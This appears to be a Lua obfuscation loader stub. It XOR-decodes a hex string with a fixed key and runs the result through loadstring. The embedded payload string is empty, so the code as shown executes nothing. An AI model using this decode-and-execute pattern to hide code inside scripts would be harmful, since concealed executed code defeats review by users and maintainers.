local k={210,249,238,253,189,23,65,232,143,46,44,73,122,8,128,130,131,175,145,18,218,51,76,93,41,19,4,160,254,66,130,63}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
